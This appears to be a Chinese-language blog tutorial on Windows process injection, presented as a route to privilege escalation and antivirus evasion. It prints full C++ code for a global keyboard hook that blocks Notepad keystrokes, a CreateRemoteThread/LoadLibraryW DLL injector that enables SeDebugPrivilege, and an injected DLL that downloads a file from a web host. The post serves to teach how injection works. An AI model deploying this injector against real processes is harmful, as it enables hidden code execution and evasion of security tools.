

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
  <link rel="icon" href="/img/head.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Epiphany">
  <meta name="keywords" content="">
  
    <meta name="description" content="从进程注入到提权 windows下的一系列注入手段在免杀和提权上有较大的用处，学习进程注入对Windows安全的理解有重要的帮助。 ¶0x01 什么是进程注入 类似于linux下的ROP，进程注入即为在一个独立活动的进程中地址空间执行任意代码的方式，此时被执行的任意代码可以访问源进程的所有资源空间，常常被用来提权，同时，该方式通过注入正常的进程，常常可以绕过杀软的检测和白名单检测。 从原理上讲，进">
<meta property="og:type" content="article">
<meta property="og:title" content="从进程注入到提权">
<meta property="og:url" content="http://example.com/2022/06/26/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/index.html">
<meta property="og:site_name" content="Epiphany&#39;s blog">
<meta property="og:description" content="从进程注入到提权 windows下的一系列注入手段在免杀和提权上有较大的用处，学习进程注入对Windows安全的理解有重要的帮助。 ¶0x01 什么是进程注入 类似于linux下的ROP，进程注入即为在一个独立活动的进程中地址空间执行任意代码的方式，此时被执行的任意代码可以访问源进程的所有资源空间，常常被用来提权，同时，该方式通过注入正常的进程，常常可以绕过杀软的检测和白名单检测。 从原理上讲，进">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg">
<meta property="article:published_time" content="2022-06-26T12:07:39.000Z">
<meta property="article:modified_time" content="2022-06-29T03:21:36.469Z">
<meta property="article:author" content="Epiphany">
<meta property="article:tag" content="windows提权">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg">
  
  
  
  <title>从进程注入到提权 - Epiphany&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/prism/1.27.0/plugins/line-numbers/prism-line-numbers.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/test.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"😊","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Yd9bxLI1IljOGgG9lkRff3xn-gzGzoHsz","app_key":"u1bgqKPgaMT2ekGfwvfs4SCT","server_url":"https://yd9bxli1.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Epiphany&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/CTF">
                    
                    CTF
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/CVE">
                    
                    CVE
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/others">
                    
                    others
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/chats">
                    
                    chats
                  </a>
                
              </div>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://s1.ax1x.com/2022/06/28/jeNzFS.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="从进程注入到提权"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-06-26 20:07" pubdate>
          星期日, 六月 26日 2022, 8:07 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          12k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          102 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">从进程注入到提权</h1>
            
            
              <div class="markdown-body">
                
                <h1>从进程注入到提权</h1>
<p>windows下的一系列注入手段在免杀和提权上有较大的用处，学习进程注入对Windows安全的理解有重要的帮助。</p>
<h2 id="0x01-什么是进程注入"><a class="header-anchor" href="#0x01-什么是进程注入">¶</a>0x01 什么是进程注入</h2>
<p>类似于linux下的ROP，进程注入即为在一个独立活动的进程中地址空间执行任意代码的方式，此时被执行的任意代码可以访问源进程的所有资源空间，常常被用来提权，同时，该方式通过注入正常的进程，常常可以绕过杀软的检测和白名单检测。</p>
<p>从原理上讲，进程注入改善了不可见性，同时一些技术也实现了持久性。</p>
<p>目前大致上有两种注入方法。</p>
<ul>
<li>dll注入</li>
<li>shellcode注入</li>
</ul>
<p>个人认为在本质上，二者都是操作系统可以执行的代码，为了方便开发，代码通常会以dll的形式编译和传播，实际上进行注入的时候，作为loadlibrary被加载。</p>
<p>注入的方式多种多样，这里我们主要看到两种注入的方式，<strong>dll和pe注入</strong></p>
<h2 id="0x02-几种进程注入的方式"><a class="header-anchor" href="#0x02-几种进程注入的方式">¶</a>0x02 几种进程注入的方式</h2>
<h3 id="dll编写规则"><a class="header-anchor" href="#dll编写规则">¶</a>dll编写规则</h3>
<p>首先我们需要了解一下dll的编写规则和一些具体的实现。</p>
<p>DLL（Dynamic Linkable Library）它提供一些可以直接使用的变量，类和函数。在经历了“无库—静态链接库—动态链接库”的历程后，dll使用十分广泛。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/W_Y2010/article/details/80428067">https://blog.csdn.net/W_Y2010/article/details/80428067</a></p>
<p>编写规则和之前写过的tinystl差不多，语法也是单纯的c语言语法。有一点不一样的是</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/27/2bb043f58574f84d.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>函数的返回值使用dll的extern 声明，表明后面的函数是dll的导出函数。基本用法就是这样还有一些别的用法不赘述，本次的重点是弄明白dll注入和hook注入和pe注入三种方式。</p>
<h3 id="hook注入原理"><a class="header-anchor" href="#hook注入原理">¶</a>hook注入原理</h3>
<p>什么是hook呢？联想glibc中的hook，调用malloc和free之前会查看其中的hook。实际上抽象出来，Windows下的hook机制也和其类似。</p>
<blockquote>
<p>hook作为一种消息监听机制，程序可以通过hook对消息或窗口进行监听，，即hook可以和特定的时间挂钩，当应用程序触发该特殊事件之后，操作系统即会向hook发出通知消息，此时hook函数就会响应对应的消息。</p>
</blockquote>
<p><img src="https://i.bmp.ovh/imgs/2022/06/27/2974a5f11e3b5ba7.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>这里借用别人的图来解释一下钩子的机制， 在Micrisoft Windows中， 每个进程都有自己的私有地址空间。当我们用指针来引用内存的时候，指针的值表示的是进程自己的自制空间的一个内存地址。进程不能创建一个指针来引用属于其他进程的内存。</p>
<p>这样虽然一定程度上保证了程序的安全性，但是却也使我们很难编写能够与其他进程通信的应用程序或对其他进程进行操控的应用程序。</p>
<p>hook就被用来再被调用函数和调用进程中充当一个中间人，用来接受消息，处理消息和转发消息。</p>
<p>Hook的类型在Windows下也有很多种，消息hook，注入hook，inline内联hook等，hook注入中，<strong>重点学习的是其中的注入hook</strong>，<strong>注入hook</strong>，和hjacking差不多，就是劫持API的调用函数。</p>
<p>但是前面说了，每个进程有一个私有的内存空间，那么我如果想要A进程hookB进程的函数，但是A又不可以直接访问B的内存空间，那么应该怎么办？</p>
<p>这个时候考虑到dll动态链接库的注入技术，hook和dll注入结合即可解决这个问题。<strong>把hook的代码写入dll中，让B程序加载dll，则hook即可生效</strong>，乍一看感觉还不如直接shellcode来的实在。一般的注入流程如下：</p>
<ol>
<li>安装一个钩子（系统的dll注入被hook）</li>
<li>保存系统函数入口处的代码</li>
<li>替换掉进程中的系统函数入口指向我们的函数（直接修改地址空间的字节）</li>
<li>当系统函数被调用时立即跳转到我们的函数</li>
<li>函数处理</li>
<li>恢复系统函数入口的代码（处理后拖钩）</li>
</ol>
<p>这时候我们回去看到给的实验代码：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/420c2138c2b9725b.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>有两个cpp函数，keyhook是编译成dll的cpp，上面是hook程序的exe，也即是A程序。</p>
<p>实现的内容是，用键盘hook技术拦截notepad.exe进程的键盘消息，使之无法显示在记事本中</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;HookMain
#include &quot;stdio.h&quot;
#include &quot;conio.h&quot;
#include &quot;windows.h&quot;

#define	DEF_DLL_NAME		&quot;KeyHook.dll&quot;
#define	DEF_HOOKSTART		&quot;HookStart&quot;
#define	DEF_HOOKSTOP		&quot;HookStop&quot;

typedef void (*PFN_HOOKSTART)();
typedef void (*PFN_HOOKSTOP)();

void main()
&#123;
	HMODULE			hDll &#x3D; NULL; &#x2F;&#x2F;代表应用程序载入的模块,被载入模块的线性地址
	PFN_HOOKSTART	HookStart &#x3D; NULL;
	PFN_HOOKSTOP	HookStop &#x3D; NULL;
	char			ch &#x3D; 0;
	
    &#x2F;&#x2F; 加载指定的dll
	hDll &#x3D; LoadLibraryA(DEF_DLL_NAME);
    if( hDll &#x3D;&#x3D; NULL )
    &#123;
        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());
        return;
    &#125;

	HookStart &#x3D; (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);
	HookStop &#x3D; (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);

	HookStart();
    
	printf(&quot;press &#39;q&#39; to quit!\n&quot;);
	while( _getch() !&#x3D; &#39;q&#39; )	;

	HookStop();
    
	FreeLibrary(hDll);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>有一些韩文注释，删掉了。看的有点点不太懂，可能需要看完dll部分才懂。</p>
<p>大致逻辑就是，先加载目标dll，然后利用<code>GetProcAddress</code> API获得hookstart函数的地址，这里用了强制类型转化，stop地址也是，具体内容需要看dll的实现。估计所有的简单hook都是这样实现的。</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;KeyHook
#include &quot;stdio.h&quot;
#include &quot;windows.h&quot;

#define DEF_PROCESS_NAME		&quot;notepad.exe&quot;

HINSTANCE g_hInstance &#x3D; NULL;
HHOOK g_hHook &#x3D; NULL;
HWND g_hWnd &#x3D; NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
&#123;
	switch( dwReason )
	&#123;
        case DLL_PROCESS_ATTACH:
			g_hInstance &#x3D; hinstDLL;
			break;

        case DLL_PROCESS_DETACH:
			break;	
	&#125;

	return TRUE;
&#125;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
&#123;
	char szPath[MAX_PATH] &#x3D; &#123;0,&#125;;
	char *p &#x3D; NULL;

	if( nCode &gt;&#x3D; 0 )
	&#123;
		&#x2F;&#x2F; bit 31 : 0 &#x3D;&gt; press, 1 &#x3D;&gt; release
		if( !(lParam &amp; 0x80000000) )&#x2F;&#x2F;释放键盘按键时
		&#123;
			GetModuleFileNameA(NULL, szPath, MAX_PATH);
			p &#x3D; strrchr(szPath, &#39;\\&#39;);

            &#x2F;&#x2F; 比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序（或者下一个钩子）
			if( !_stricmp(p + 1, DEF_PROCESS_NAME) )
				return 1;
		&#125;
	&#125;

    &#x2F;&#x2F; 如果不是notepad.exe，则调用CallNextHookEx函数，将消息传递给应用程序
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
&#125;

#ifdef __cplusplus
extern &quot;C&quot; &#123;
#endif
	__declspec(dllexport) void HookStart()
	&#123;
		g_hHook &#x3D; SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);
	&#125;

	__declspec(dllexport) void HookStop()
	&#123;
		if( g_hHook )
		&#123;
			UnhookWindowsHookEx(g_hHook);
			g_hHook &#x3D; NULL;
		&#125;
	&#125;
#ifdef __cplusplus
&#125;
#endif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>实现了三个部分，第一部分是dllmain函数，第二部分是主要的hook函数，第三部分是调用的接口，从HookMain可知，hook是从HookStart开始的。</p>
<p>了解到<code>SetWindowsHookEx</code>函数，是hook的安装函数，这里就不得不提一下hook在内存中的存在形式了。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rosesmall/p/3248300.html">https://www.cnblogs.com/rosesmall/p/3248300.html</a></p>
<p>每一个Hook都有一个与之相关联的<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/159417.htm">指针</a>列表，称之为钩子<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/549479.htm">链表</a>，由系统来维护。这个列表的<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/159417.htm">指针</a>指向指定的，应用程序定义的，被Hook子程调用的<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/414773.htm">回调函数</a>，也就是该钩子的各个处理子程。当与指定的Hook类型关联的消息发生时，系统就把这个消息传递到Hook子程。 一些Hook子程可以只监视消息，或者修改消息，或者停止消息的前进，避免这些消息传递到下一个Hook子程或者目的窗口。最后安装的钩子放在链的开始， 而最早安装的钩子放在最后，也就是后加入的先获得控制权。</p>
<p>Windows 并不要求钩子子程的<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/386432.htm">卸载</a>顺序一定得和安装顺序相反。每当有一个钩子被<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/386432.htm">卸载</a>，Windows 便释放其占用的内存，并更新整个Hook链表。如果程序安装了钩子，但是在尚未<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/386432.htm">卸载</a>钩子之前就结束了，那么系统会自动为它做卸载钩子的操作。</p>
<p>SetWindowsHookEx函数总会在hook链的开头安装hook子程。当指定类型的Hook监视的事件发生时，系统就调用与这个Hook关联的 Hook链的开头的Hook子程。每一个Hook链中的Hook子程都决定是否把这个事件传递到下一个Hook子程。Hook子程传递事件到下一个 Hook子程需要调用CallNextHookEx函数。</p>
<p>函数原型如下：</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">HHOOK SetWindowsHookEx(
int idHook, &#x2F;&#x2F; 钩子的类型，即它处理的消息类型
HOOKPROC lpfn, &#x2F;&#x2F; 钩子子程的地址指针。如果dwThreadId参数为0
&#x2F;&#x2F; 或是一个由别的进程创建的线程的标识，
&#x2F;&#x2F; lpfn必须指向DLL中的钩子子程。
&#x2F;&#x2F; 除此以外，lpfn可以指向当前进程的一段钩子子程代码。
&#x2F;&#x2F; 钩子函数的入口地址，当钩子钩到任何消息后便调用这个函数。
HINSTANCE hMod, &#x2F;&#x2F; 应用程序实例的句柄。标识包含lpfn所指的子程的DLL。
&#x2F;&#x2F; 如果dwThreadId 标识当前进程创建的一个线程，
&#x2F;&#x2F; 而且子程代码位于当前进程，hMod必须为NULL。
&#x2F;&#x2F; 可以很简单的设定其为本应用程序的实例句柄。
DWORD dwThreadId &#x2F;&#x2F; 与安装的钩子子程相关联的线程的标识符。
&#x2F;&#x2F; 如果为0，钩子子程与所有的线程关联，即为全局钩子。
);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>把我们创建的钩子函数作为入口地址，钩到消息即传递给该函数。而hook函数就是简单的，劫持notepad的消息，不往下传递，这就导致了notepad的进程按键无法被正确响应。实现了hook。</p>
<h3 id="dll注入代码分析"><a class="header-anchor" href="#dll注入代码分析">¶</a>dll注入代码分析</h3>
<p>还是看到注入代码。</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;
#include &quot;tchar.h&quot;

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) 
&#123;
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid;

    if( !OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
			              &amp;hToken) )
    &#123;
        _tprintf(L&quot;OpenProcessToken error: %u\n&quot;, GetLastError());
        return FALSE;
    &#125;

    if( !LookupPrivilegeValue(NULL,           &#x2F;&#x2F; lookup privilege on local system
                              lpszPrivilege,  &#x2F;&#x2F; privilege to lookup 
                              &amp;luid) )        &#x2F;&#x2F; receives LUID of privilege
    &#123;
        _tprintf(L&quot;LookupPrivilegeValue error: %u\n&quot;, GetLastError() ); 
        return FALSE; 
    &#125;

    tp.PrivilegeCount &#x3D; 1;
    tp.Privileges[0].Luid &#x3D; luid;
    if( bEnablePrivilege )
        tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes &#x3D; 0;

    &#x2F;&#x2F; Enable the privilege or disable all privileges.
    if( !AdjustTokenPrivileges(hToken, 
                               FALSE, 
                               &amp;tp, 
                               sizeof(TOKEN_PRIVILEGES), 
                               (PTOKEN_PRIVILEGES) NULL, 
                               (PDWORD) NULL) )
    &#123; 
        _tprintf(L&quot;AdjustTokenPrivileges error: %u\n&quot;, GetLastError() ); 
        return FALSE; 
    &#125; 

    if( GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED )
    &#123;
        _tprintf(L&quot;The token does not have the specified privilege. \n&quot;);
        return FALSE;
    &#125; 

    return TRUE;
&#125;

BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)
&#123;
    HANDLE hProcess &#x3D; NULL, hThread &#x3D; NULL;
    HMODULE hMod &#x3D; NULL;
    LPVOID pRemoteBuf &#x3D; NULL;
    DWORD dwBufSize &#x3D; (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
    LPTHREAD_START_ROUTINE pThreadProc;

    &#x2F;&#x2F; #1. dwPID notepad.exe
    if ( !(hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )
    &#123;
        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;, dwPID, GetLastError());
        return FALSE;
    &#125;

    &#x2F;&#x2F; #2.分配一块内存在目标进程中，用来存储dll的路径，设置权限为读写。
    pRemoteBuf &#x3D; VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);

    &#x2F;&#x2F; #3. 写入路径
    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);

    &#x2F;&#x2F; #4. LoadLibraryA() API 
    hMod &#x3D; GetModuleHandle(L&quot;kernel32.dll&quot;);
    pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;);
	
    &#x2F;&#x2F; #5. notepad.exe 
    hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);	

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
&#125;

int _tmain(int argc, TCHAR *argv[])
&#123;
    if( argc !&#x3D; 3)
    &#123;
        _tprintf(L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;, argv[0]);
        return 1;
    &#125;

    &#x2F;&#x2F; change privilege
    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )
        return 1;

    &#x2F;&#x2F; inject dll
    if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) )
        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;, argv[2]);
    else
        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;, argv[2]);

    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>看main函数的usage就知道这是一个对指定pid注入指定dll的程序。</p>
<p>重点看到injectdll函数，<code>SetPrivilege</code>被用来设定权限。</p>
<p><code>pRemoteBuf =  VirtualAllocEx(hProcess,NULL,dwBufSize,MEM_COMMIT,PAGE_READWRITE)</code>将要注入的dll路径写入目标进程内存。因为任何内存空间都无法写入，所以调用<code>VirtualAllocEx（）</code>在目标进程分配一块缓冲区，指定缓冲区大小为dll文件路径长度。同时设定权限为读写。</p>
<p>写入路径之后，调用了线程函数<code>hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);</code>创建远程线程，线程属于pProcess，还有一些参数，LoadLibraryW的地址和dll路径的地址。</p>
<p>看到dll代码</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;
#include &quot;tchar.h&quot;

#pragma comment(lib, &quot;urlmon.lib&quot;)

#define DEF_URL     	(L&quot;http:&#x2F;&#x2F;www.naver.com&#x2F;index.html&quot;)
#define DEF_FILE_NAME   (L&quot;index.html&quot;)

HMODULE g_hMod &#x3D; NULL;

DWORD WINAPI ThreadProc(LPVOID lParam)
&#123;
    TCHAR szPath[_MAX_PATH] &#x3D; &#123;0,&#125;;

    if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )
        return FALSE;
	
    TCHAR *p &#x3D; _tcsrchr( szPath, &#39;\\&#39; );
    if( !p )
        return FALSE;

    _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME);

    URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL);

    return 0;
&#125;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
&#123;
    HANDLE hThread &#x3D; NULL;

    g_hMod &#x3D; (HMODULE)hinstDLL;

    switch( fdwReason )
    &#123;
    case DLL_PROCESS_ATTACH : 
        OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;);
        hThread &#x3D; CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
        CloseHandle(hThread);
        break;
    &#125;

    return TRUE;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>这个就比较简单了，意思就是调用指定的API下载指定的文件到指定的地点。</p>
<p>综上：注入的main函数，创建一个新线程加载指定路径的dll，而该dll实现远程下载的功能。</p>
<p>这里利用了一个Windows os下的特性，由于要使得指定的线程加载，则需要知道目标线程的API函数地址，但是在Windows中，因为OS核心dll会被加载到自身固定的地址，dll注入利用的就是window OS的这一特性。所以，导入InjectDll.exe进程中的LoadLibraryW（）地址与导入notepad.exe进程中的LoadLibraryW（）地址是相同的。</p>
<h2 id="0x03-实践"><a class="header-anchor" href="#0x03-实践">¶</a>0x03 实践</h2>
